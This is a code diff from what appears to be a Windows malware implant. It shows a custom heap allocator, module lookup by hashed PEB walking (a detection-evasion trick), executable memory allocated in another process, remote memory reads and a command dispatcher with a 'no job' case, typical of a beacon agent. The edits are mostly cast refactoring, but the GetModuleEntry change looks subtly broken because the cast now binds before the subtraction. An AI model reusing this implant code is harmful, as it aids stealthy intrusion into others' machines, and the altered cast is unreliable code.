@@ -1,8 +1,8 @@
 #include <core/include/memory.hpp>
 
 void* operator new(size_t size) {
-
     void *ptr = nullptr;
+
     if (Ctx->heap && Ctx->nt.RtlAllocateHeap) {
         ptr = Ctx->nt.RtlAllocateHeap(Ctx->heap, 0, size);
 
@@ -15,7 +15,6 @@ void* operator new(size_t size) {
 }
 
 void operator delete(void* ptr) noexcept {
-
     if (Ctx->heap && Ctx->nt.RtlFreeHeap && ptr) {
         if (!Ctx->nt.RtlFreeHeap(Ctx->heap, 0, ptr)) {
             NtCurrentTeb()->LastErrorValue = ERROR_INVALID_PARAMETER;
@@ -38,18 +37,17 @@ namespace Memory {
         UINT_PTR GetStackCookie() {
 
             uintptr_t cookie = 0;
-            if (!NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
-                cookie = 0;
-            }
+            x_ntassert(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr));
+
+            defer:
             return cookie;
         }
 
         _resource* GetIntResource(HMODULE base, const int rsrc_id) {
 
             HRSRC       res_info    = { };
-            _resource   *object     = { };
+            _resource   *object     = (_resource*)  x_malloc(sizeof(_resource));
 
-            object = S_CAST(_resource*,  x_malloc(sizeof(_resource)));
             x_assert(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
             x_assert(object->h_global  = Ctx->win32.LoadResource(base, res_info));
             x_assert(object->size      = Ctx->win32.SizeofResource(base, res_info));
@@ -61,7 +59,7 @@ namespace Memory {
 
         _executable* CreateImageData(uint8_t *data) {
 
-            _executable *image = R_CAST(_executable*, x_malloc(sizeof(_executable)));
+            _executable *image = (_executable*) x_malloc(sizeof(_executable));
 
             image->buffer   = data;
             image->dos_head = DOS_HEADER(image->buffer);
@@ -123,12 +121,12 @@ namespace Memory {
         }
 
         LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
-            const auto head = R_CAST(PLIST_ENTRY, &(PEB_POINTER)->Ldr->InMemoryOrderModuleList);
+            const auto head = (LIST_ENTRY*) &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
             for (auto next = head->Flink; next != head; next = next->Flink) {
                 wchar_t lowercase[MAX_PATH] = { };
 
-                const auto mod  = R_CAST(LDR_DATA_TABLE_ENTRY*, B_PTR(next) - sizeof(uint32_t) * 4);
+                const auto mod  = (LDR_DATA_TABLE_ENTRY*) B_PTR(next) - sizeof(uint32_t) * 4;
                 const auto name = mod->BaseDllName;
 
                 if (hash - Utils::GetHashFromStringW(x_wcsToLower(lowercase, name.Buffer), x_wcslen(name.Buffer)) == 0) {
@@ -195,7 +193,7 @@ namespace Memory {
         UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
 
             uintptr_t   ret     = 0;
-            const auto  address = R_CAST(uintptr_t, target);
+            const auto  address = (uintptr_t) target;
 
             for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
                 if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
@@ -219,8 +217,8 @@ namespace Memory {
 
             size_t      read    = 0;
             uintptr_t   address = 0;
+            uint8_t     *buffer = (uint8_t*) x_malloc(size);
 
-            auto buffer  = R_CAST(uint8_t*, x_malloc(size));
             x_ntassert(Ctx->nt.NtReadVirtualMemory(process, R_CAST(void *, start), buffer, size, &read));
 
             for (auto i = 0; i < size; i++) {
@@ -242,9 +240,10 @@ namespace Memory {
 
         BOOL ExecuteCommand(_parser &parser) {
 
-            const auto  cmd_id      = Parser::UnpackDword(&parser);
             _command    cmd         = { };
             uintptr_t   address     = { };
+
+            const auto  cmd_id      = Parser::UnpackDword(&parser);
             bool        success     = true;
 
             if (cmd_id == NOJOB) {
